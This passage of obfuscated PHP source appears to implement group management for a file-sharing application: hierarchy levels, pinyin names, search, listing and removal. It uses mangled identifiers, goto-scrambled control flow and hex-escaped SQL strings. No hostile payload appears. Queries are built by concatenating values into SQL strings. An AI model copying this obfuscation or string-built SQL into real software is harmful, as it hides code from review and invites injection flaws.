|| !$AŒÌÓ…á¸) { return !1; } if ($f¿­øŞ£ˆó[$D¯’ËÉÔ¦¡[2105]] == $AŒÌÓ…á¸[$D¯’ËÉÔ¦¡[2105]]) { return !1; } if ($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[461]] != $f¿­øŞ£ˆó[$D¯’ËÉÔ¦¡[461]]) { if ($AŒÌÓ…á¸[$D¯’ËÉÔ¦¡[459]] !== $f¿­øŞ£ˆó[$D¯’ËÉÔ¦¡[459]] && strpos($AŒÌÓ…á¸[$D¯’ËÉÔ¦¡[459]], $f¿­øŞ£ˆó[$D¯’ËÉÔ¦¡[459]] . $f¿­øŞ£ˆó[$D¯’ËÉÔ¦¡[2105]] . $D¯’ËÉÔ¦¡[47]) === 0) { return !1; } $EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[525]] = $AŒÌÓ…á¸[$D¯’ËÉÔ¦¡[459]] . $EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[461]] . $D¯’ËÉÔ¦¡[47]; $this->_changeChildLevel($f¿­øŞ£ˆó, $AŒÌÓ…á¸); } } if (isset($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[28]])) { $this->setNamePinyin($eÙïÏ†¦ç, $EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[28]]); } if (isset($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[2177]])) { $this->metaSet($eÙïÏ†¦ç, array($D¯’ËÉÔ¦¡[2177] => $EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[2177]], $D¯’ËÉÔ¦¡[2178] => $EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[2178]])); unset($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[2177]]); unset($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[2178]]); } return $this->where(array($D¯’ËÉÔ¦¡[2179] => $eÙïÏ†¦ç))->save($EÆŒ¿‹İ­£); } private function _changeChildLevel($dàÆîÂ†í, $E‰Ê­îÃß‘, $f¤ø™’–Ÿƒ = false) { goto f˜˜‡œ»ëÄ; a—®Ô¿Š±: if ($f¤ø™’–Ÿƒ) { $Eé‚¢‘ÚŒ± = $E‰Ê­îÃß‘[$d¤ïã“‚Ç[459]] . $E‰Ê­îÃß‘[$d¤ïã“‚Ç[2105]] . $d¤ïã“‚Ç[47]; } $e§¡¥Îöò´ = array($d¤ïã“‚Ç[525] => array($d¤ïã“‚Ç[483], $dàÆîÂ†í[$d¤ïã“‚Ç[459]] . $dàÆîÂ†í[$d¤ïã“‚Ç[2105]] . $d¤ïã“‚Ç[484])); $F„Ü¹›‡¯ = array($d¤ïã“‚Ç[525] => array($d¤ïã“‚Ç[534], "\x72\145\x70\154\141\143\145\50\160\x61\x72\145\x6e\x74\x4c\x65\x76\145\154\x2c\x27{$bõ±‚½ø´Ñ}\47\x2c\47{$Eé‚¢‘ÚŒ±}\47\51")); goto e•˜ëÍ¾¼Õ; f˜˜‡œ»ëÄ: $d¤ïã“‚Ç =& $_SERVER[¼€¼ˆ¦‚¡]; $bõ±‚½ø´Ñ = $dàÆîÂ†í[$d¤ïã“‚Ç[459]] . $dàÆîÂ†í[$d¤ïã“‚Ç[2105]] . $d¤ïã“‚Ç[47]; $Eé‚¢‘ÚŒ± = $E‰Ê­îÃß‘[$d¤ïã“‚Ç[459]] . $E‰Ê­îÃß‘[$d¤ïã“‚Ç[2105]] . $d¤ïã“‚Ç[47] . $dàÆîÂ†í[$d¤ïã“‚Ç[2105]] . $d¤ïã“‚Ç[47]; goto a—®Ô¿Š±; e•˜ëÍ¾¼Õ: $this->where($e§¡¥Îöò´)->data($F„Ü¹›‡¯)->save(); goto b±“ÎÍáÄ; b±“ÎÍáÄ: } public function setNamePinyin($c…âïÀ›¼, $c’œÓ÷•è­ = false) { $dÔ³Å„ÒÀ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$c’œÓ÷•è­) { $a·ïš¬¹ê = $this->getInfoSimple($c…âïÀ›¼); $c’œÓ÷•è­ = $a·ïš¬¹ê[$dÔ³Å„ÒÀ[28]]; } if (!Input::check($c’œÓ÷•è­, $dÔ³Å„ÒÀ[528])) { $this->metaSet($c…âïÀ›¼, $dÔ³Å„ÒÀ[416], null); $this->metaSet($c…âïÀ›¼, $dÔ³Å„ÒÀ[415], null); return; } $CÚÅƒŠÛæ‰ = array($dÔ³Å„ÒÀ[416] => str_replace($dÔ³Å„ÒÀ[50], $dÔ³Å„ÒÀ[33], Pinyin::encode($c’œÓ÷•è­)), $dÔ³Å„ÒÀ[415] => Pinyin::encode($c’œÓ÷•è­, $dÔ³Å„ÒÀ[529])); $this->metaSet($c…âïÀ›¼, $CÚÅƒŠÛæ‰); } protected function groupStatus($aĞê‹øÔ, $eÏ­¤íÁÇÀ) { goto bÍÈ«ÛÀ–; föêôšÙ•‹: foreach ($a‚”´®¨õ as $aĞê‹øÔ) { $fœ¯í¶¡™‘[] = array($d¶°èôİ÷Ì[2105] => $aĞê‹øÔ, $d¶°èôİ÷Ì[89] => $d¶°èôİ÷Ì[685], $d¶°èôİ÷Ì[359] => $eÏ­¤íÁÇÀ); } return Model($d¶°èôİ÷Ì[2180])->addAll($fœ¯í¶¡™‘, array(), !0); goto aÎ‰¸ôˆ•Š; bÍÈ«ÛÀ–: $d¶°èôİ÷Ì =& $_SERVER[¼€¼ˆ¦‚¡]; $d‘Ëãøß‹Ñ = $this->getInfoSimple($aĞê‹øÔ); if (!$d‘Ëãøß‹Ñ) { return !1; } goto E‹Áç§Ôƒ„; E‹Áç§Ôƒ„: if ($eÏ­¤íÁÇÀ == $d¶°èôİ÷Ì[83]) { $a‚”´®¨õ = $this->parentLevelArray($d‘Ëãøß‹Ñ[$d¶°èôİ÷Ì[459]]); } else { $eÊöÀ•÷ŞÚ = array($d¶°èôİ÷Ì[525] => array($d¶°èôİ÷Ì[483], $d‘Ëãøß‹Ñ[$d¶°èôİ÷Ì[459]] . $d‘Ëãøß‹Ñ[$d¶°èôİ÷Ì[2105]] . $d¶°èôİ÷Ì[484])); $a‚”´®¨õ = $this->where($eÊöÀ•÷ŞÚ)->field($d¶°èôİ÷Ì[2105])->select(); $a‚”´®¨õ = array_to_keyvalue($a‚”´®¨õ, $d¶°èôİ÷Ì[33], $d¶°èôİ÷Ì[2105]); } $a‚”´®¨õ[] = $d‘Ëãøß‹Ñ[$d¶°èôİ÷Ì[2105]]; $fœ¯í¶¡™‘ = array(); goto föêôšÙ•‹; aÎ‰¸ôˆ•Š: } private function _groupStatusApply($F…Í”åãì³, $EÂçµá¬Ä¼) { $d·¤ïƒí°ß =& $_SERVER[¼€¼ˆ¦‚¡]; if ($EÂçµá¬Ä¼ == $d·¤ïƒí°ß[83]) { $bßÛÚ»ãéÒ = $this->parentLevelArray($F…Í”åãì³[$d·¤ïƒí°ß[459]]); } else { $AŠ‚´†ò = array($d·¤ïƒí°ß[525] => array($d·¤ïƒí°ß[483], $F…Í”åãì³[$d·¤ïƒí°ß[459]] . $F…Í”åãì³[$d·¤ïƒí°ß[2105]] . $d·¤ïƒí°ß[484])); $bßÛÚ»ãéÒ = $this->where($AŠ‚´†ò)->field($d·¤ïƒí°ß[2105])->select(); $bßÛÚ»ãéÒ = array_to_keyvalue($bßÛÚ»ãéÒ, $d·¤ïƒí°ß[33], $d·¤ïƒí°ß[2105]); } if (empty($bßÛÚ»ãéÒ)) { return; } $Cë–øËä® = array(); foreach ($bßÛÚ»ãéÒ as $d´ìÂ‰Ù©) { $Cë–øËä®[] = array($d·¤ïƒí°ß[2105] => $d´ìÂ‰Ù©, $d·¤ïƒí°ß[89] => $d·¤ïƒí°ß[685], $d·¤ïƒí°ß[359] => $EÂçµá¬Ä¼); } Model($d·¤ïƒí°ß[2180])->addAll($Cë–øËä®, array(), !0); } protected function groupRemove($EäÍ±Â¯ˆ) { goto Fëè«éÙç©; Fëè«éÙç©: $eäÒŠŸ‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $dµçù£¬˜ = array($eäÒŠŸ‹[2105] => $EäÍ±Â¯ˆ); $f±éËÎôËî = $this->where($dµçù£¬˜)->find(); goto dôª¾øßêŒ; F¹ƒäƒê‰: $this->where(array($eäÒŠŸ‹[461] => $EäÍ±Â¯ˆ))->save(array($eäÒŠŸ‹[461] => $f±éËÎôËî[$eäÒŠŸ‹[461]])); Model($eäÒŠŸ‹[2180])->where($dµçù£¬˜)->delete(); Model($eäÒŠŸ‹[2181])->where($dµçù£¬˜)->delete(); goto b¹ÕâíÎÄ»; dôª¾øßêŒ: if (!$f±éËÎôËî || $f±éËÎôËî[$eäÒŠŸ‹[461]] == 0) { return !1; } $b‡½µøØÖÅ = $this->getInfoSimple($f±éËÎôËî[$eäÒŠŸ‹[461]]); $this->_changeChildLevel($f±éËÎôËî, $b‡½µøØÖÅ, !0); goto F¹ƒäƒê‰; b¹ÕâíÎÄ»: Model($eäÒŠŸ‹[749])->groupRootRemove($EäÍ±Â¯ˆ); return $this->where($dµçù£¬˜)->delete(); goto D˜‘Ü¸ˆ¿²; D˜‘Ü¸ˆ¿²: } protected function groupSort($E½Š­Œ áÌ) { $fí÷ì‹ìˆ§ =& $_SERVER[¼€¼ˆ¦‚¡]; $aïÒâœ„® = array(); foreach ($E½Š­Œ áÌ as $F¤Í’ò£’¾ => $b¼ôğó½áª) { $aïÒâœ„®[] = array($fí÷ì‹ìˆ§[2105], $b¼ôğó½áª, $fí÷ì‹ìˆ§[2126], $F¤Í’ò£’¾ + 1); } $this->saveAll($aïÒâœ„®); } public function listData() { $Få¿µãŠÆ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Få¿µãŠÆ[$_SERVER[¼€¼ˆ¦‚¡][354]]); return $Få¿µãŠÆ; } private function _makeOrder($F‹¡³ÊŸ£ = '') { goto FêÏ˜Ú ––; bâŠï—Ş“·: $F”éÖ–Š = Input::get($fèŞËÇ¤ÅÜ[407], $fèŞËÇ¤ÅÜ[7], $fèŞËÇ¤ÅÜ[2109], $bÔÀ“†’“è); $dò¯™¯ï Æ = Input::get($fèŞËÇ¤ÅÜ[408], $fèŞËÇ¤ÅÜ[7], $fèŞËÇ¤ÅÜ[2182], array($fèŞËÇ¤ÅÜ[2182], $fèŞËÇ¤ÅÜ[404])); $dò¯™¯ï Æ = $b˜ä„¹‚[$dò¯™¯ï Æ]; goto bÒ»›¶…ç; bÒ»›¶…ç: $F‹¡³ÊŸ£ = $F‹¡³ÊŸ£ . "{$F”éÖ–Š}\40{$dò¯™¯ï Æ}\x2c\x20\147\162\157\x75\160\111\x44\x20\x61\163\143"; return $this->order($F‹¡³ÊŸ£); goto Dİé‚±áğ²; FêÏ˜Ú ––: $fèŞËÇ¤ÅÜ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÔÀ“†’“è = array($fèŞËÇ¤ÅÜ[2105], $fèŞËÇ¤ÅÜ[28], $fèŞËÇ¤ÅÜ[2091], $fèŞËÇ¤ÅÜ[187]); $b˜ä„¹‚ = array($fèŞËÇ¤ÅÜ[402] => $fèŞËÇ¤ÅÜ[403], $fèŞËÇ¤ÅÜ[404] => $fèŞËÇ¤ÅÜ[405]); goto bâŠï—Ş“·; Dİé‚±áğ²: } public function listChild($dŒ›Ó†²á¸) { $c© Ü”œø =& $_SERVER[¼€¼ˆ¦‚¡]; $cº‚ªÀº”Ÿ = $this->where(array($c© Ü”œø[461] => $dŒ›Ó†²á¸))->_makeOrder()->selectPage(200); $this->_listDataApply($cº‚ªÀº”Ÿ[$c© Ü”œø[354]]); return $cº‚ªÀº”Ÿ; } public function listByID($B£ª—£ø¢¸) { $aİŞßœº¦Ì =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$B£ª—£ø¢¸) { return array(); } $cå­‹ÊÏºç = array($aİŞßœº¦Ì[2105] => array($aİŞßœº¦Ì[7], $B£ª—£ø¢¸)); $dåéØäõÅ¦ = $this->where($cå­‹ÊÏºç)->select(); $this->_listDataApply($dåéØäõÅ¦); return $dåéØäõÅ¦; } public function listSearch($b‚‰œËí²¤) { goto dâ›ŸŒ±”; añå”¶£µ: if (!$CÂ¥Úê´Íç || count($CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[354]]) < 5 && Input::check($C„ïäÈä‹, $eÛØ‘Ê˜Íé[306])) { goto bÌá·³Ú¨Û; B¡ƒ‚Ó›…Ì: $CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[351]][$eÛØ‘Ê˜Íé[353]] = ceil($CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[351]][$eÛØ‘Ê˜Íé[352]] / $CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[351]][$eÛØ‘Ê˜Íé[349]]); goto Fêˆğ´ò»Œ; f…ˆ‰³…: $Eñ·àãÙ»Á = array_merge($eï³‹À¸«ª, $d¶ƒ±î„â, $CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[354]]); $CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[354]] = array_unique_by_key($Eñ·àãÙ»Á, $eÛØ‘Ê˜Íé[2105]); $CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[351]][$eÛØ‘Ê˜Íé[352]] = count($CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[354]]); goto B¡ƒ‚Ó›…Ì; bÌá·³Ú¨Û: $e”Ïõ§Êá¡ = $this->groupChildrenAll($D—ô­ä÷ÖÛ); $eï³‹À¸«ª = $this->_searchFromMeta($eÛØ‘Ê˜Íé[415], $C„ïäÈä‹, 10, $e”Ïõ§Êá¡); $d¶ƒ±î„â = $this->_searchFromMeta($eÛØ‘Ê˜Íé[416], $C„ïäÈä‹, 10, $e”Ïõ§Êá¡); goto f…ˆ‰³…; Fêˆğ´ò»Œ: } $this->_listDataApply($CÂ¥Úê´Íç[$eÛØ‘Ê˜Íé[354]]); return $CÂ¥Úê´Íç; goto f…Â¾ÕàÃ; D‘È†ÜğÍ«: if ($D—ô­ä÷ÖÛ) { $BŒ«ßÊÊ‹Í = $this->getInfoSimple($D—ô­ä÷ÖÛ); $dÕ†•‰·ÜØ = $BŒ«ßÊÊ‹Í[$eÛØ‘Ê˜Íé[459]] . $D—ô­ä÷ÖÛ . $eÛØ‘Ê˜Íé[484]; $AÖÇ¬¼‹ = array($AÖÇ¬¼‹, array($eÛØ‘Ê˜Íé[459] => array($eÛØ‘Ê˜Íé[748], $dÕ†•‰·ÜØ))); } $CÂ¥Úê´Íç = $this->_makeOrder()->where($AÖÇ¬¼‹)->selectPage(20); $CÂ¥Úê´Íç = $CÂ¥Úê´Íç ? $CÂ¥Úê´Íç : array(); goto añå”¶£µ; C‚’¦ËñÂî: if (!trim($C„ïäÈä‹)) { return !1; } $C„ïäÈä‹ = str_replace($eÛØ‘Ê˜Íé[2185], $eÛØ‘Ê˜Íé[2186], $C„ïäÈä‹); $AÖÇ¬¼‹ = array($eÛØ‘Ê˜Íé[2105] => array($eÛØ‘Ê˜Íé[748], "\45{$C„ïäÈä‹}\x25"), $eÛØ‘Ê˜Íé[28] => array($eÛØ‘Ê˜Íé[748], "\x25{$C„ïäÈä‹}\45"), $eÛØ‘Ê˜Íé[913] => $eÛØ‘Ê˜Íé[2187]); goto D‘È†ÜğÍ«; dâ›ŸŒ±”: $eÛØ‘Ê˜Íé =& $_SERVER[¼€¼ˆ¦‚¡]; $C„ïäÈä‹ = $b‚‰œËí²¤[$eÛØ‘Ê˜Íé[2183]]; $D—ô­ä÷ÖÛ = isset($b‚‰œËí²¤[$eÛØ‘Ê˜Íé[2184]]) ? $b‚‰œËí²¤[$eÛØ‘Ê˜Íé[2184]] : !1; goto C‚’¦ËñÂî; f…Â¾ÕàÃ: } protected function groupChildrenAll($DÇËœÉ²Çª) { $CßİÏ§çŞØ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$DÇËœÉ²Çª) { return !1; } if (is_string($DÇËœÉ²Çª)) { $DÇËœÉ²Çª = array($DÇËœÉ²Çª); } $D¾¦ì´‘Ì© = $DÇËœÉ²Çª; foreach ($DÇËœÉ²Çª as $b ˆ•­Ñ¬È) { $Cæ¿ˆŸ¢ò¾ = $this->getInfoSimple($b ˆ•­Ñ¬È); $aª´Ë¸ÔöŒ = array($CßİÏ§çŞØ[459] => array($CßİÏ§çŞØ[748], $Cæ¿ˆŸ¢ò¾[$CßİÏ§çŞØ[459]] . $b ˆ•­Ñ¬È . $CßİÏ§çŞØ[484])); $dÒñè¼îŒ = $this->field($CßİÏ§çŞØ[2105])->where($aª´Ë¸ÔöŒ)->select(); $D¾¦ì´‘Ì© = array_merge($D¾¦ì´‘Ì©, array_to_keyvalue($dÒñè¼îŒ, $CßİÏ§çŞØ[33], $CßİÏ§çŞØ[2105])); } return array_unique($D¾¦ì´‘Ì©); } private function _searchFromMeta($Eİ±¾ŸŒ‘µ, $EøÊ‚è÷ê, $EºØ›†ì¾è, $fŒ¥æŞÉ¬) { goto F…°‘ä¨ÌÍ; F‹˜ÊéˆŠ: if ($fŒ¥æŞÉ¬) { $côš˜ˆßëØ[$b ‘Ì„ÃÉ[2105]] = array($b ‘Ì„ÃÉ[7], $fŒ¥æŞÉ¬); } $F™’†¡ò = Model($b ‘Ì„ÃÉ[2188])->where($côš˜ˆßëØ)->limit($EºØ›†ì¾è)->select(); if (!$F™’†¡ò) { return array(); } goto A´‰æÚŸ‰; F…°‘ä¨ÌÍ: $b ‘Ì„ÃÉ =& $_SERVER[¼€¼ˆ¦‚¡]; $EøÊ‚è÷ê = strtolower($EøÊ‚è÷ê); $côš˜ˆßëØ = array($b ‘Ì„ÃÉ[89] => $Eİ±¾ŸŒ‘µ, $b ‘Ì„ÃÉ[359] => array($b ‘Ì„ÃÉ[748], "\x25{$EøÊ‚è÷ê}\x25")); goto F‹˜ÊéˆŠ; A´‰æÚŸ‰: $F™’†¡ò = array_to_keyvalue($F™’†¡ò, $b ‘Ì„ÃÉ[33], $b ‘Ì„ÃÉ[2105]); $bÓ½”‹Ä = $this->where(array($b ‘Ì„ÃÉ[2179] => array($b ‘Ì„ÃÉ[7], $F™’†¡ò)))->select(); if (!$bÓ½”‹Ä) { return array(); } goto fÂ‡Ø…õ‚›; fÂ‡Ø…õ‚›: return $bÓ½”‹Ä; goto f“Ûôù–¢; f“Ûôù–¢: } protected function _listDataApplyItem($e¹Á•¦á) { $CÙù¸Æñ = array($e¹Á•¦á); $this->_listDataApply($CÙù¸Æñ); return $CÙù¸Æñ[0]; } protected function _listDataApply(&$f‘î°ÈõäŠ) { goto AïĞ¤¢²º; f«ä­ˆ›è: $this->_listAppendChildren($f‘î°ÈõäŠ); $this->_listAppendChildrenMember($f‘î°ÈõäŠ); $this->_listAppendMeta($f‘î°ÈõäŠ, $CÖ©‘Öè‡Ì); goto aÉÙ’ƒ§Ïè; AïĞ¤¢²º: $FÂ³‰ù³¸© =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$f‘î°ÈõäŠ) { return; } $CÖ©‘Öè‡Ì = array_to_keyvalue($f‘î°ÈõäŠ, $FÂ³‰ù³¸©[33], $FÂ³‰ù³¸©[2105]); goto f«ä­ˆ›è; aÉÙ’ƒ§Ïè: $this->_listAppendParent($f‘î°ÈõäŠ); $this->_listAppendSourceRoot($f‘î°ÈõäŠ, $CÖ©‘Öè‡Ì); goto B ÍÈÓ•†±; B ÍÈÓ•†±: } private function _listAppendChildren(&$FÎåíµÁªê) { goto Fß··Ã¾¨; Fß··Ã¾¨: $d×˜ù­œÏ‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $b‡Ü¼òë¾Ì = $d×˜ù­œÏ‚[361]; $cÔˆ‚ìŒï„ = array(); goto cĞ©†ÔÍ‡¼; DÇè®©Ó§: $cÔˆ‚ìŒï„ = array_to_keyvalue($cÔˆ‚ìŒï„, $d×˜ù­œÏ‚[450]); foreach ($FÎåíµÁªê as &$e»ˆ””¨Ú) { $e»ˆ””¨Ú[$d×˜ù­œÏ‚[2189]] = isset($cÔˆ‚ìŒï„[$e»ˆ””¨Ú[$d×˜ù­œÏ‚[2105]] . $d×˜ù­œÏ‚[2190]]); } goto c†‘ÆÚô³Ú; cĞ©†ÔÍ‡¼: $B¦±öŸá´ó = count($FÎåíµÁªê); $c£Ş´âÚ = $this->tablePrefix . $this->tableName; for ($b¯ Œ‰ÎÕ¡ = 0, $DÈö²öÇè‚ = 0; $b¯ Œ‰ÎÕ¡ < $B¦±öŸá´ó; $b¯ Œ‰ÎÕ¡++) { $DÈö²öÇè‚++; $aˆÚ£æ…±¹ = $FÎåíµÁªê[$b¯ Œ‰ÎÕ¡][$d×˜ù­œÏ‚[2105]]; $b‡Ü¼òë¾Ì .= "\x53\105\x4c\x45\103\x54\40\52\x20\106\122\117\115\x20\x28\123\105\x4c\105\103\x54\x20\47{$aˆÚ£æ…±¹}\137\143\x68\x69\154\x64\x27\40\x61\x73\40\x68\x61\x73\x20\x46\x52\117\x4d\x20\140{$c£Ş´âÚ}\x60\x20\167\x68\x65\162\x65\40\x70\x61\162\x65\156\164\111\x44\x3d{$aˆÚ£æ…±¹}\40\x6c\151\155\151\164\40\x31\51\x20\141\163\x20\164\x62\137{$aˆÚ£æ…±¹}\40\165\156\151\x6f\156\x20\x61\154\x6c\40"; if (($DÈö²öÇè‚ >= 20 || $b¯ Œ‰ÎÕ¡ == $B¦±öŸá´ó - 1) && $b‡Ü¼òë¾Ì) { $b‡Ü¼òë¾Ì = substr($b‡Ü¼òë¾Ì, 0, -strlen($d×˜ù­œÏ‚[449])); $aÀ¶¼…¤¥¼ = $this->query($b‡Ü¼òë¾Ì); $cÔˆ‚ìŒï„ = array_merge($cÔˆ‚ìŒï„, $aÀ¶¼…¤¥¼); $DÈö²öÇè‚ = 0; $b‡Ü¼òë¾Ì = $d×˜ù­œÏ‚[33]; } } goto DÇè®©Ó§; c†‘ÆÚô³Ú: } private function _listAppendChildrenMember(&$dÂ‚¦±ééÂ) { goto Bë¸ßî¦ğ; F¼’Ä¿ßŸ: $d¥İóî×Ô = array_to_keyvalue($d¥İóî×Ô, $E¬»Ÿøé§§[450]); foreach ($dÂ‚¦±ééÂ as &$c”Œù‰„) { $c”Œù‰„[$E¬»Ÿøé§§[2191]] = isset($d¥İóî×Ô[$c”Œù‰„[$E¬»Ÿøé§§[2105]] . $E¬»Ÿøé§§[2190]]); } goto bïô˜Œ„¢; FÇ«¿ä£¦: $Aù„§æŒœ = count($dÂ‚¦±ééÂ); $E“Œ‡™Í¥© = $this->tablePrefix . $E¬»Ÿøé§§[2181]; for ($AÌ—ÂæÇ¨Î = 0, $D¹£“ªö² = 0; $AÌ—ÂæÇ¨Î < $Aù„§æŒœ; $AÌ—ÂæÇ¨Î++) { $D¹£“ªö²++; $C›ˆ°ÕÆÇ… = $dÂ‚¦±ééÂ[$AÌ—ÂæÇ¨Î][$E¬»Ÿøé§§[2105]]; $fØöĞ·¹—„ .= "\x53\x45\x4c\105\x43\x54\x20\x2a\x20\x46\x52\x4f\115\x20\50\x53\105\x4c\x45\x43\x54\x20\47{$C›ˆ°ÕÆÇ…}\x5f\x63\x68\x69\x6c\144\47\40\141\163\x20\150\141\x73\40\106\122\117\115\x20\x60{$E“Œ‡™Í¥©}\x60\x20\167\x68\x65\x72\145\40\147\162\157\x75\x70\111\x44\75{$C›ˆ°ÕÆÇ…}\40\x6c\x69\155\151\x74\x20\x31\51\40\141\163\x20\x74\x62\137{$C›ˆ°ÕÆÇ…}\x20\165\156\151\157\156\40\x61\x6c\154\x20"; if (($D¹£“ªö² >= 20 || $AÌ—ÂæÇ¨Î == $Aù„§æŒœ - 1) && $fØöĞ·¹—„) { $fØöĞ·¹—„ = substr($fØöĞ·¹—„, 0, -strlen($E¬»Ÿøé§§[449])); $c—Èğ¿íô‰ = $this->query($fØöĞ·¹—„); $d¥İóî×Ô = array_merge($d¥İóî×Ô, $c—Èğ¿íô‰); $D¹£“ªö² = 0; $fØöĞ·¹—„ = $E¬»Ÿøé§§[33]; } } goto F¼’Ä¿ßŸ; Bë¸ßî¦ğ: $E¬»Ÿøé§§ =& $_SERVER[¼€¼ˆ¦‚¡]; $fØöĞ·¹—„ = $E¬»Ÿøé§§[361]; $d¥İóî×Ô = array(); goto FÇ«¿ä£¦; bïô˜Œ„¢: } private function _listAppendMeta(&$Bá«¸í´´¯, $døùÔé«) { $Côíëêô‰œ =& $_SERVER[¼€¼ˆ¦‚¡]; $e¾Ë‚å¦˜´ = array($Côíëêô‰œ[2105] => array($Côíëêô‰œ[7], $døùÔé«)); $DâÁ×§é† = Model($Côíëêô‰œ[2180])->where($e¾Ë‚å¦˜´)->select(); $DâÁ×§é† = array_to_keyvalue_group($DâÁ×§é†, $Côíëêô‰œ[2105]); foreach ($DâÁ×§é† as &$D­ÆË£ÁñÖ) { $D­ÆË£ÁñÖ = array_to_keyvalue($D­ÆË£ÁñÖ, $Côíëêô‰œ[89], $Côíëêô‰œ[359]); } foreach ($Bá«¸í´´¯ as &$C‘ˆ½ô»‘Ñ) { $C‘ˆ½ô»‘Ñ[$Côíëêô‰œ[417]] = array(); if (isset($DâÁ×§é†[$C‘ˆ½ô»‘Ñ[$Côíëêô‰œ[2105]]])) { $C‘ˆ½ô»‘Ñ[$Côíëêô‰œ[417]] = $DâÁ×§é†[$C‘ˆ½ô»‘Ñ[$Côíëêô‰œ[2105]]]; } } } protected function parentLevelArray($c¹è³‘´ó÷) { $då™…”İğ§ =& $_SERVER[¼€¼ˆ¦‚¡]; $c¹è³‘´ó÷ = explode($då™…”İğ§[47], trim($c¹è³‘´ó÷, $då™…”İğ§[47])); $c¹è³‘´ó÷ = array_remove_value($c¹è³‘´ó÷, $då™…”İğ§[468]); return $c¹è³‘´ó÷; } private function _listAppendParent(&$DŸĞˆˆæ–Ë) { goto d•¡ù‰Š–; A¸øóºÁÜ’: $c‘ì–ŞŞ”† = $GLOBALS[$aŒíØ³ÉÃ¿[6]][$aŒíØ³ÉÃ¿[84]][$aŒíØ³ÉÃ¿[2193]]; foreach ($DŸĞˆˆæ–Ë as &$a£˜ÊÍ†é) { $C’æÈáäˆ = $this->parentLevelArray($a£˜ÊÍ†é[$aŒíØ³ÉÃ¿[459]]); $eœœºÛÀ° = $aŒíØ³ÉÃ¿[33]; foreach ($C’æÈáäˆ as $c¿©µ¤ö‹£ => $aÏŠ‹İô¼ë) { if ($c‘ì–ŞŞ”† && $c¿©µ¤ö‹£ == 0) { continue; } $eœœºÛÀ° .= $EïÁ°ßˆ¬é[$aÏŠ‹İô¼ë] . $aŒíØ³ÉÃ¿[8]; } if ($C’æÈáäˆ) { $eœœºÛÀ° .= $a£˜ÊÍ†é[$aŒíØ³ÉÃ¿[28]]; } $a£˜ÊÍ†é[$aŒíØ³ÉÃ¿[463]] = str_replace($aŒíØ³ÉÃ¿[467], $aŒíØ³ÉÃ¿[8], $eœœºÛÀ°); } goto DÙ§¸½œÒê; d•¡ù‰Š–: $aŒíØ³ÉÃ¿ =& $_SERVER[¼€¼ˆ¦‚¡]; $EïÁ°ßˆ¬é = array(); foreach ($DŸĞˆˆæ–Ë as &$a£˜ÊÍ†é) { $EïÁ°ßˆ¬é[$a£˜ÊÍ†é[$aŒíØ³ÉÃ¿[2105]]] = $a£˜ÊÍ†é[$aŒíØ³ÉÃ¿[28]]; $C’æÈáäˆ = $this->parentLevelArray($a£˜ÊÍ†é[$aŒíØ³ÉÃ¿[459]]); foreach ($C’æÈáäˆ as $aÏŠ‹İô¼ë) { if (!isset($EïÁ°ßˆ¬é[$aÏŠ‹İô¼ë])) { $EïÁ°ßˆ¬é[$aÏŠ‹İô¼ë] = 0; } } } goto dîë‚ÎªâÔ; dîë‚ÎªâÔ: $e¥ÈĞ¸š¥´ = array(); foreach ($EïÁ°ßˆ¬é as $c¿©µ¤ö‹£ => $AÓÍÁÄ…¯Î) { if (!$AÓÍÁÄ…¯Î) { $e¥ÈĞ¸š¥´[] = $c¿©µ¤ö‹£; } } if ($e¥ÈĞ¸š¥´) { $A”©ë Õ½¤ = array($aŒíØ³ÉÃ¿[2179] => array($aŒíØ³ÉÃ¿[384], $e¥ÈĞ¸š¥´)); $cù…±‹Ù´Ğ = $this->field($aŒíØ³ÉÃ¿[2192])->where($A”©ë Õ½¤)->select(); $a´Ê„ã²ê = array_to_keyvalue($cù…±‹Ù´Ğ, $aŒíØ³ÉÃ¿[2105], $aŒíØ³ÉÃ¿[28]); $EïÁ°ßˆ¬é = array_merge_index($EïÁ°ßˆ¬é, $a´Ê„ã²ê); } goto A¸øóºÁÜ’; DÙ§¸½œÒê: } private function _listAppendSourceRoot(&$dÃÉó—ã, $fÍ’ƒ–•¹ó) { goto E„ƒÒ†ğ; DÆğÏ²öÍê: $F»ôÈŠ¸¾Û = Model($aë´ßÈãœ°[749])->order($aë´ßÈãœ°[2195])->field($Fº«´¾Éñ)->where($F‰™´Õ‚İ¾)->select(); $F»ôÈŠ¸¾Û = array_to_keyvalue($F»ôÈŠ¸¾Û, $aë´ßÈãœ°[456]); $F»ôÈŠ¸¾Û = array_remove_key($F»ôÈŠ¸¾Û, $aë´ßÈãœ°[456]); goto d‘ªšÊ•””; d‘ªšÊ•””: foreach ($dÃÉó—ã as &$c§ÎöŸÍù) { $c§ÎöŸÍù[$aë´ßÈãœ°[391]] = $F»ôÈŠ¸¾Û[$c§ÎöŸÍù[$aë´ßÈãœ°[2105]]] ? $F»ôÈŠ¸¾Û[$c§ÎöŸÍù[$aë´ßÈãœ°[2105]]] : array(); } goto bâîò¨Ëƒó; E„ƒÒ†ğ: $aë´ßÈãœ° =& $_SERVER[¼€¼ˆ¦‚¡]; $F‰™´Õ‚İ¾ = array($aë´ßÈãœ°[371] => SourceModel::TYPE_GROUP, 